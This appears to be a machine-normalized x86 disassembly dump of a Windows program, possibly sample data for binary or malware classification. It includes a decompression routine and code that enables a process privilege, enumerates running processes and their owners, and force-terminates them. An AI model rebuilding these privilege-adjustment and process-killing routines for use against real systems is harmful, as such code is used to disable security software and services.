inc [ esi + 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
push eax
mov eax esi
call sub_421958
mov ebx [ ebp - 0x10 ]
push ebx
mov eax esi
call sub_421b1e
mov eax [ ebp - 0x4 ]
inc ebx
and ebx edi
inc eax
and eax edi
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] eax
je r-xdata
sub_422332
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi eax
xor ebx ebx
mov [ esi + 0x4 ] ebx
call sub_4225ab
mov [ esi ] eax
call sub_4225ab
shl eax 0x8
or [ esi ] eax
call sub_4225ab
shl eax 0x10
or [ esi ] eax
call sub_4225ab
shl eax 0x18
or [ esi ] eax
je r-xdata
pop esi
pop ebx
leave
retn
push edi
mov eax esi
call sub_421da2
mov edi 0xfc4
push edi
lea eax [ esi + 0x8 ]
push 0x20
push eax
call sub_42b5a0
add esp 0xc
mov [ ebp - 0x8 ] edi
mov [ ebp - 0xc ] ebx
cmp [ esi ] ebx
jbe r-xdata
pop edi
lea ebx [ edi + 0x3b ]
mov [ ebp - 0x4 ] eax
mov eax edi
cmp [ ebp - 0x4 ] ax
mov eax esi
jb r-xdata
call sub_421c49
add [ ebp - 0x4 ] ax
movzx eax [ ebp - 0x4 ]
movzx eax [ esi + eax * 2 + 0x7e90 ]
add [ ebp - 0x4 ] 0xfd8d
push [ ebp - 0x4 ]
call sub_421f6f
mov eax 0x100
cmp [ ebp - 0x4 ] ax
jge r-xdata
mov eax esi
call sub_421cad
movzx edi ax
movzx eax di
movzx cx [ eax + rw-data ]
movzx ax [ eax + rw-data ]
sub ax 0x2
shl cx 0x6
movzx eax ax
movzx ecx cx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] eax
test ax ax
je r-xdata
movsx eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_42262e
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
and edi 0x3f
or edi [ ebp - 0x14 ]
add ecx 0xffffff03
sub eax edi
movzx ecx cx
dec eax
xor edx edx
and eax ebx
xor edi edi
cmp dx cx
mov [ ebp - 0x4 ] ecx
jge r-xdata
add [ ebp - 0x10 ] 0xffff
mov eax esi
call sub_421c49
lea ecx [ edi + edi ]
add ax cx
cmp [ ebp - 0x10 ] 0x0
movzx edi ax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov dl [ ebp - 0x4 ]
movsx ecx ax
inc eax
and eax ebx
inc [ ebp - 0xc ]
mov [ ecx + esi + 0x8 ] dl
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ esi ]
jb r-xdata
cwde
mov [ ebp - 0x14 ] eax
movzx eax [ esi + 0x8374 ]
mov edi 0x273
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov dl [ ebp - 0x10 ]
movsx ecx ax
inc eax
and eax ebx
inc [ ebp - 0xc ]
inc edi
cmp di [ ebp - 0x4 ]
mov [ ecx + esi + 0x8 ] dl
mov [ ebp - 0x8 ] eax
jl r-xdata
mov eax [ ebp - 0x14 ]
add eax edi
and eax ebx
movzx ax [ eax + esi + 0x8 ]
movzx eax ax
mov [ ebp - 0x10 ] eax
cwde
push eax
mov eax esi
call sub_42262e
cmp eax 0xffffffff
je r-xdata
sub_4224df
mov eax [ ebx + 0x8390 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebx + 0x83a4 ]
inc eax
cmp eax [ ebx + 0x8398 ]
push esi
push edi
jle r-xdata
mov eax 0x401
push eax
mov [ ebx + 0x8398 ] eax
call sub_425484
pop ecx
mov ecx [ ebx + 0x8390 ]
mov [ ecx ] eax
mov eax [ ebx + 0x8390 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebx + 0x8390 ]
mov edi [ eax ]
add edi [ ebx + 0x83a4 ]
mov esi [ esp + 0xc ]
movsb [ edi ] [ esi ]
inc [ ebx + 0x83a4 ]
mov eax [ ebx + 0x83a4 ]
mov ecx [ ebx + 0x839c ]
mov [ ecx ] eax
xor eax eax
inc eax
imul eax eax 0x3
cdq
sub eax edx
mov esi eax
sar esi 0x1
add esi 0x400
push esi
call sub_425484
mov edi eax
pop ecx
test edi edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push [ ebx + 0x83a4 ]
mov eax [ ebx + 0x8390 ]
push [ eax ]
push edi
call sub_4285a0
mov eax [ ebx + 0x8390 ]
push [ eax ]
call sub_424869
mov eax [ ebx + 0x8390 ]
mov [ eax ] edi
add esp 0x10
mov [ ebx + 0x8398 ] esi
or eax 0xffffffff
jmp r-xdata
retn 0x4
pop edi
pop esi
sub_4225ab
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ esi + 0x83a8 ]
push ebx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
push ebx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0x8384 ]
mov [ ebp - 0x8 ] ebx
call [ ReadFile@IAT ]
mov ebx [ ebp - 0x8 ]
jmp r-xdata
cmp ebx 0x1
pop ebx
je r-xdata
mov eax [ esi + 0x8394 ]
push edi
mov edi [ esi + 0x83a0 ]
xor ebx ebx
lea ecx [ edi + 0x1 ]
inc ebx
cmp ecx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
or eax 0xffffffff
leave
retn
mov eax [ esi + 0x838c ]
add eax edi
push ebx
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_4285a0
add esp 0xc
add edi ebx
mov [ esi + 0x83a0 ] edi
pop edi
sub eax edi
mov ebx eax
sub_42262e
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ ebx + 0x83a8 ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
and [ ebp - 0x4 ] eax
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push [ ebx + 0x8388 ]
call [ WriteFile@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
lea eax [ ebp + 0x8 ]
push eax
call sub_4224df
jmp r-xdata
dec eax
neg eax
sbb eax eax
pop ebx
leave
retn 0x4
sub_422689
cmp [ esi + 0x4 ] 0x0
push ebp
push edi
mov edi 0x2000
mov ebp edi
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push edi
call sub_425484
pop ecx
mov [ esi + 0x4 ] eax
pop edi
pop ebp
retn
push ebx
push 0x0
push edi
push eax
push 0x5
call [ esi ]
mov ebx 0xc0000004
jmp r-xdata
cmp eax ebx
je r-xdata
add ebp edi
push ebp
push [ esi + 0x4 ]
call sub_42554e
pop ecx
pop ecx
push 0x0
push ebp
push eax
push 0x5
mov [ esi + 0x4 ] eax
call [ esi ]
pop ebx
sub_4226d9
push ebp
mov ebp esp
sub esp 0x434
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi 0x103
push esi
mov [ ebp - 0x42c ] eax
xor edi edi
lea eax [ ebp - 0x21b ]
push edi
push eax
mov [ ebp - 0x425 ] 0x0
mov [ ebp - 0x21c ] 0x0
call sub_42b5a0
push esi
lea eax [ ebp - 0x113 ]
push edi
push eax
mov [ ebp - 0x114 ] 0x0
call sub_42b5a0
add esp 0x18
mov esi ebx
call sub_422689
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] edi
jne r-xdata
push 0x208
lea eax [ ebp - 0x424 ]
push edi
push eax
call sub_42b5a0
mov esi 0x104
push esi
lea eax [ ebp - 0x114 ]
push edi
push eax
call sub_42b5a0
add esp 0x18
lea eax [ ebp - 0x424 ]
push eax
mov eax [ ebx + 0x4 ]
push [ eax + 0x44 ]
call sub_422947
push edi
push edi
push esi
lea eax [ ebp - 0x21c ]
push eax
mov eax [ ebx + 0x4 ]
push 0xffffffff
push [ eax + 0x3c ]
push edi
push edi
call [ WideCharToMultiByte@IAT ]
lea eax [ ebp - 0x21c ]
push eax
mov eax [ ebx + 0x4 ]
push [ eax + 0x44 ]
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_42354a
lea eax [ ebp - 0x114 ]
add esp 0x10
mov esi eax
mov [ ebp - 0x425 ] 0x1
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x42c ]
sub eax esi
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push 0x104
lea eax [ ebp - 0x114 ]
and ecx 0x3
push 0x0
push eax
[ edi ] [ esi ]
call sub_42b5a0
lea eax [ ebp - 0x320 ]
add esp 0xc
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
lea eax [ ebp - 0x424 ]
push eax
je r-xdata
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_42354a
add esp 0xc
lea eax [ ebp - 0x320 ]
push eax
lea eax [ ebp - 0x114 ]
push r--data
push eax
call sub_42354a
add esp 0x10
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x42c ]
sub eax esi
dec edi
lea eax [ ebp - 0x114 ]
mov esi eax
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
add ecx eax
cmp [ ebp - 0x425 ] 0x0
mov [ ebx + 0x4 ] ecx
je r-xdata
xor edi edi
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
pop esi
call sub_4234de
leave
retn 0x4
sub_4228c4
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn
push edi
lea eax [ ebp - 0xc ]
push eax
push r--data
xor edi edi
push edi
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push edi
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
push edi
push edi
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1c ]
push eax
neg esi
sbb esi esi
push edi
push [ ebp - 0x4 ]
and esi 0x2
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x10 ] esi
call [ AdjustTokenPrivileges@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
inc eax
jmp r-xdata
pop edi
sub_422947
push 0x24
push r--data
call sub_42b398
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
push edi
push 0x400
call [ OpenProcess@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_422a1d
jmp sub_422a1d
lea ecx [ ebp - 0x20 ]
push ecx
push 0x8
push eax
call [ OpenProcessToken@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp + 0x8 ] edi
lea eax [ ebp + 0x8 ]
push eax
push edi
push edi
push 0x1
push [ ebp - 0x20 ]
mov esi [ GetTokenInformation@IAT ]
call esi
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
add eax eax
push eax
call sub_4246c6
pop ecx
mov ebx eax
mov [ ebp - 0x28 ] ebx
mov eax [ ebp + 0x8 ]
add eax eax
mov [ ebp + 0x8 ] eax
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push ebx
push 0x1
push [ ebp - 0x20 ]
call esi
mov [ ebp - 0x1c ] eax
call [ GetLastError@IAT ]
cmp [ ebp - 0x1c ] edi
je r-xdata
mov eax 0x104
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x104 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push [ ebx ]
push edi
call [ LookupAccountSidA@IAT ]
mov [ ebp - 0x1c ] eax
sub_422a1d
cmp [ ebp - 0x24 ] edi
je r-xdata
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ ebp - 0x24 ]
call [ CloseHandle@IAT ]
cmp [ ebp - 0x28 ] edi
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_42b3dd
retn 0x8
push [ ebp - 0x28 ]
call sub_42412e
pop ecx
sub_422a55
push esi
push edi
xor edi edi
inc edi
mov eax edi
call sub_4228c4
push [ esp + 0xc ]
push edi
push 0x1fffff
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseHandle@IAT ]
xor eax eax
call sub_4228c4
mov eax edi
pop edi
pop esi
retn 0x4
push 0x0
push esi
call [ TerminateProcess@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x1f4
call [ Sleep@IAT ]
sub_422aa6
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov esi eax
call sub_422689
xor ebx ebx
push 0x208
mov [ ebp - 0x8 ] ebx
call sub_4246c6
mov edi [ MultiByteToWideChar@IAT ]
pop ecx
push ebx
push ebx
push 0xffffffff
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push ebx
push ebx
mov [ ebp - 0xc ] ebx
call edi
push eax
push [ ebp - 0x4 ]
push 0xffffffff
push [ ebp + 0x8 ]
push ebx
push ebx
call edi
cmp [ eax + 0x3c ] ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
mov eax [ esi + 0x4 ]
push 0x4
push [ eax + 0x3c ]
push [ ebp - 0x4 ]
call sub_43a38b
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ eax ]
add ecx eax
mov [ esi + 0x4 ] ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
add ecx eax
mov [ esi + 0x4 ] ecx
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ esi + 0x4 ]
push [ eax + 0x44 ]
call sub_422a55
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
push [ ebp - 0x4 ]
call sub_42412e
mov eax [ ebp - 0xc ]
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_422b4b
push 0x44
mov eax sub_43a5f3
call sub_425dad
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_4010d3
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_42597b
int3
sub_422b83
push 0x44
mov eax sub_43a5f3
call sub_425dad
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_4048fa
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_42597b
int3
sub_422bd1
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x20 ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_422bf8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x0
mov ecx esi
call sub_422bd1
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
and [ esi + 0x1c ] 0x0
test eax eax
je r-xdata
mov edi [ eax ]
push eax
call sub_42412e
pop ecx
mov eax edi
test edi edi
jne r-xdata
and [ esi + 0x20 ] 0x0
pop edi
pop esi
pop ebp
retn
mov edi [ eax ]
push eax
call sub_42412e
pop ecx
mov eax edi
test edi edi
jne r-xdata
sub_422c43
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] 0x0
jbe r-xdata
push esi
call sub_422bf8
pop ecx
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
dec [ eax + rw-data ]
mov eax [ esi + 0x4 ]
cmp [ eax + rw-data ] 0x0
jg r-xdata
pop esi
pop ebp
retn
push 0x1
call sub_40932d
sub_422cae
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_422c99
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_42412e
pop ecx
sub_422ccf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
pop ebp
retn
call sub_406175
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_422cf0
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_42303e
push rw-data
call sub_422ccf
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_423066
leave
retn
sub_422d22
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_422cf0
mov [ rw-data ] 0x1
call sub_4233c8
pop ecx
sub_422d4c
push 0x4
mov eax sub_43a616
call sub_425dad
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_42303e
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
ja r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_424869
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_423066
call sub_425e4c
retn
mov ecx [ eax ]
call sub_406175
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_422dac
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_42303e
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx eax
mov eax [ eax ]
push 0x1
mov [ rw-data ] eax
call sub_422cae
lea ecx [ ebp - 0x4 ]
call sub_423066
leave
retn
sub_422de1
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x8
call sub_4246c6
pop ecx
test eax eax
je r-xdata
push sub_422dac
call sub_422c7f
pop ecx
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_422e1f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x50 ] 0x0
jbe r-xdata
pop ebp
retn
cmp [ eax + 0x54 ] 0x10
jb r-xdata
add eax 0x40
mov eax [ eax + 0x40 ]
jmp r-xdata
push eax
push 0x0
call sub_427324
pop ecx
pop ecx
sub_422e47
push 0x4
mov eax sub_43a639
call sub_425dad
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov al [ ebp + 0x8 ]
push r--data
lea ecx [ esi + 0x18 ]
mov [ esi ] r--data
mov [ esi + 0x14 ] al
call sub_403dc1
mov eax esi
call sub_425e4c
retn 0x4
sub_422e90
push 0x4
mov eax sub_43a667
call sub_425dad
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
push esi
mov [ ebp - 0x4 ] 0x1
call sub_422d4c
pop ecx
push 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_40415f
mov [ esi ] r--data
call sub_425e4c
retn
sub_422ecd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_422e90
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_42412e
pop ecx
sub_422eee
push 0x8
mov eax sub_43a694
call sub_425dad
mov eax [ rw-data ]
mov esi eax
test eax eax
jne r-xdata
mov eax esi
call sub_425e4c
retn
push eax
lea ecx [ ebp - 0x10 ]
call sub_42303e
mov eax [ rw-data ]
and [ ebp - 0x4 ] esi
mov esi eax
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_423066
push 0x34
call sub_4246c6
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
xor esi esi
push esi
call sub_422e47
mov esi eax
jmp r-xdata
push esi
mov [ ebp - 0x4 ] 0x0
call sub_422d22
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
mov [ esp ] r--data
call sub_40409c
mov ecx esi
mov [ rw-data ] esi
call sub_40614d
mov eax [ rw-data ]
mov [ rw-data ] eax
sub_422f88
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
push esi
push edi
jb r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
push eax
lea ecx [ edi + 0x3c ]
call sub_40409c
test esi esi
je r-xdata
mov eax r--data
push 0x0
push 0x0
call sub_427324
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax r--data
push esi
push 0x0
call sub_427324
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ edi + 0x58 ]
call sub_40409c
pop edi
pop esi
pop ebp
retn
sub_422fe4
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_423413
add esi 0x18
cmp esi rw-data
pop ecx
jl r-xdata
pop esi
sub_423015
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jge r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_423423
add esi 0x18
cmp esi rw-data
pop ecx
jl r-xdata
pop esi
sub_42303e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4
push esi
mov esi ecx
mov [ esi ] eax
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_423433
pop ecx
sub_42307d
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_4246c6
push eax
mov [ esi ] eax
call sub_423413
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_4230d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_4262c2
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_42629c
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_42856a
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_424cd6
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_428525
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_4231dd
mov edi edi
push ebp
mov ebp esp
push esi
call sub_4262c2
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_42629c
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_42894a
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_42856a
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_42856a
push eax
push [ esi + 0x8 ]
call sub_4285a0
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_42323d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_4262c2
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_42629c
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_42856a
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_424d55
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_428525
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_423377
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_4267be
push esi
call sub_424869
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4233c8
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
dec eax
mov [ rw-data ] eax
mov [ eax * 4 + rw-data ] ecx
pop ebp
retn
pop ebp
jmp sub_4262e8
sub_4234ed
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_425eb1
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop edi
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4250d0
add esp 0xc
call sub_425eb1
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
